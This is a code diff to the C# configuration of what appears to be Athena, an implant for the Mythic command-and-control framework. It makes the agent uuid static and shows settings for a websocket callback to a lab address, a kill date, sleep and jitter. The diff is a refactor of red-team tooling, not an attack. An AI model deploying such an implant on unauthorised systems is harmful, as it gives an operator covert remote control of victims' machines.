@@ -12,7 +12,7 @@ namespace Athena.Config
     public class MythicConfig
     {
         public Websocket currentConfig { get; set; }
-        public string uuid { get; set; }
+        public static string uuid { get; set; }
         public DateTime killDate { get; set; }
         public int sleep { get; set; }
         public int jitter { get; set; }
@@ -20,14 +20,14 @@ namespace Athena.Config
 
         public MythicConfig()
         {
-            this.uuid = "9f8cecf0-9b48-4064-a595-4ee68e610238";
+            uuid = "9f8cecf0-9b48-4064-a595-4ee68e610238";
             DateTime kd = DateTime.TryParse("killdate", out kd) ? kd : DateTime.MaxValue;
             this.killDate = kd;
             int sleep = int.TryParse("1", out sleep) ? sleep : 60;
             this.sleep = sleep;
             int jitter = int.TryParse("5", out jitter) ? jitter : 10;
             this.jitter = jitter;
-            this.currentConfig = new Websocket(this.uuid);
+            this.currentConfig = new Websocket();
             this.forwarder = new Forwarder();
         }
     }
@@ -48,7 +48,7 @@ namespace Athena.Config
         public bool encrypted { get; set; }
         public int connectAttempts { get; set; }
 
-        public Websocket(string uuid)
+        public Websocket()
         {
             int callbackPort = Int32.Parse("8081");
             string callbackHost = "ws://192.168.4.201";
@@ -60,7 +60,7 @@ namespace Athena.Config
             this.encryptedExchangeCheck = bool.Parse("false");
             if (!string.IsNullOrEmpty(this.psk))
             {
-                this.crypt = new PSKCrypto(uuid, this.psk);
+                this.crypt = new PSKCrypto(MythicConfig.uuid, this.psk);
                 this.encrypted = true;
             }
 
@@ -110,7 +110,7 @@ namespace Athena.Config
                 }
                 else
                 {
-                    json = await Misc.Base64Encode(Globals.mc.MythicConfig.uuid + json);
+                    json = await Misc.Base64Encode(MythicConfig.uuid + json);
                 }
 
                 WebSocketMessage m = new WebSocketMessage()
